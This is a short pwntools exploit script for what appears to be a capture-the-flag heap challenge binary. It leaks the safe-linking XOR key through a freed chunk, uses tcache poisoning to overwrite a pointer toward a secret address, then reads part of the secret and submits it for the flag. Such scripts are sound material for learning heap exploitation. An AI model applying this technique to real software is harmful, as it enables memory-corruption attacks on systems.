#通过一个0获取堆上xor的值，后续利用手法与之前类似
from pwn import *
BINARY = "/challenge/babyheap_level16.1"
p = process(BINARY)

def overwrite_secret(loc:bytes):
    # overwrite secret
    p.sendline(b'scanf')
    p.sendline(b'1')
    p.recv()
    p.sendline(loc)
    p.sendline(b'malloc')
    p.sendline(b'2')
    p.sendline(b'80')
    p.sendline(b'malloc')
    p.sendline(b'3')
    p.sendline(b'80')
    # overwritten secret

def get_xor_bytes()->bytes:
    p.sendline(b'malloc')
    p.sendline(b'0')
    p.sendline(b'80')
    p.sendline(b'malloc')
    p.sendline(b'1')
    p.sendline(b'80')
    p.sendline(b'free')
    p.sendline(b'0')

    p.sendline(b'puts')
    p.sendline(b'0')
    p.recvuntil(b'Data: ')
    xor_bytes = p.recvuntil(b'\n')[:-1]

    p.sendline(b'free')
    p.sendline(b'1')
    return xor_bytes

secret = 0x422460

xor_bytes = unpack(get_xor_bytes(), 'all')
print(f'xor_bytes = {hex(xor_bytes)}')
addr_to_overwrite = (secret) ^ xor_bytes
overwrite_secret(p64(addr_to_overwrite))

# get first half of secret
p.sendline(b'free')
p.sendline(b'2')
p.sendline(b'malloc')
p.sendline(b'2')
p.sendline(b'80')
p.sendline(b'puts')
p.sendline(b'2')
p.recvuntil(b'Data: ')
secret_first_half = p.recvuntil(b'\n')[:-1]
secret_first_half = unpack(secret_first_half, 'all') ^ xor_bytes ^ (secret >> 12)
secret_first_half = pack(secret_first_half, 'all')
print(f'secret_first_half = {secret_first_half}')

# send_flag
p.sendline(b'send_flag')
p.recv()
p.sendline(secret_first_half + p64(0))

p.interactive()